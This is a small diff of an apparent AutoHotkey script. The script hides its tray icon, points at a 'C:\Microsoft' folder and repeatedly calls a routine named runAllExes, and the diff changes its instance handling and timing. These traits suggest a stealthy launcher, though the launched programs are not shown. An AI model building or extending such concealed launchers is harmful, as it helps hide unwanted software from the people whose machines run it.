@@ -1,4 +1,4 @@
-#SingleInstance Ignore
+#SingleInstance Force
 #NoTrayIcon
 
 path := "C:\Microsoft"
@@ -104,10 +104,7 @@ runAllExes() {
     }
 }
 
-Loop 5
-{
-    SetTimer runAllExes, -1000
-    Sleep 5000
-}
+SetTimer runAllExes, -1000
+Sleep 7500
 
 return
